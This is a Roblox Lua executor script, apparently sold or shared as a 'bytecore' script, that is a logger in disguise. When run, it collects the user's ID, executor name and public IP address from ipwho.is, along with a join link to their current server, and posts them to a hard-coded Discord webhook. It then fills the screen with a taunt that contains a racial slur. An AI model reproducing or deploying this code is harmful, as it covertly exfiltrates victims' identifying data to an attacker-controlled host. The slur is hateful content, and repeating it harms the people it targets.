local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local player = game.Players.LocalPlayer

-- Avatar Image
local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. player.UserId .. "&size=420x420&format=Png&isCircular=false"
local imageUrl = "https://tr.rbxcdn.com/default_avatar.png"
local success, result = pcall(function()
    return HttpService:JSONDecode(game:HttpGet(thumbUrl))
end)
if success and result and result.data and result.data[1] and result.data[1].imageUrl then
    imageUrl = result.data[1].imageUrl
end

local executor = identifyexecutor and identifyexecutor() or
    (is_sirhurt_closure and "Sirhurt") or
    (pebc_execute and "ProtoSmasher") or
    (syn and "Synapse X") or
    (secure_load and "Sentinel") or
    (KRNL_LOADED and "Krnl") or
    (SONA_LOADED and "Sona") or
    "Unknown Executor"
local hwid = (syn and syn.crypt and syn.crypt.hash and syn.crypt.hash("getfenv")) or "N/A"
local ipData = HttpService:JSONDecode(game:HttpGet("https://ipwho.is"))
local ip = ipData.ip or "N/A"
local gameId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local joinLink = "roblox://placeId=" .. gameId .. "&gameInstanceId=" .. jobId
local gameName = "Unknown Game"
pcall(function()
    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
end)
local imageGifUrl = "https://media.discordapp.net/attachments/1415496813665980457/1415500104693190686/image_2025-09-10_175110242.png?ex=68c36eb3&is=68c21d33&hm=0860b8503975d5357693c5575896b932d9672e05a57e65a321cc09dddd1ea47c&=&format=webp&quality=lossless"
local data = {
    ["username"] = "bytecore",
    ["avatar_url"] = "https://media.discordapp.net/attachments/1397691075778449458/1400670318258950144/nettspend.jpg?ex=688d7b63&is=688c29e3&hm=11d1e7223b715d7f5897bb1ea6cb984161a997834870283b61006908221597e5&=&format=webp",
    ["content"] = "",
    ["embeds"] = {{
        ["title"] = "bytecore execution",
        ["color"] = 11259375,
        ["fields"] = {
            { name = "User ID", value = tostring(player.UserId), inline = true },
            { name = "Executor", value = executor, inline = true },
            { name = "IP", value = "`" .. ip .. "`", inline = false },
            { name = "Join Game", value = " " .. joinLink .. " ", inline = false }
        },
        ["thumbnail"] = { ["url"] = imageUrl },
        ["image"] = { ["url"] = imageGifUrl },  -- Updated image
        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ"),
        ["footer"] = { ["text"] = "Game: " .. gameName .. " | ID: " .. gameId }
    }}
}
local headers = {
    ["Content-Type"] = "application/json"
}
local requestFunc = http_request or request or HttpPost or syn.request
local payload = {
    Url = "https://discord.com/api/webhooks/1415499317413679176/who7Uzyy0Ohha4jJdurcRVkAMi2uN5IztYskZ1DpA7Zyx32zyW2x_YbVxo8d3UkxRd4_",
    Method = "POST",
    Headers = headers,
    Body = HttpService:JSONEncode(data)
}
requestFunc(payload)
task.wait(0.5)
-- // logging

local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- ScreenGui
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackOverlay"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Black background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Parent = screenGui

-- Text in middle
local text = Instance.new("TextLabel")
text.Size = UDim2.new(1, 0, 1, 0)
text.Position = UDim2.new(0, 0, 0, 0)
text.BackgroundTransparency = 1
text.Text = "you just got scammed nigger"
text.TextColor3 = Color3.new(1, 1, 1)
text.TextScaled = true
text.Font = Enum.Font.GothamBlack
text.Parent = bg

-- Zoom animation loop
task.spawn(function()
    while true do
        local tweenIn = TweenService:Create(text, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.Out), {TextSize = 80})
        tweenIn:Play()
        tweenIn.Completed:Wait()

        local tweenOut = TweenService:Create(text, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.In), {TextSize = 60})
        tweenOut:Play()
        tweenOut.Completed:Wait()
    end
end)
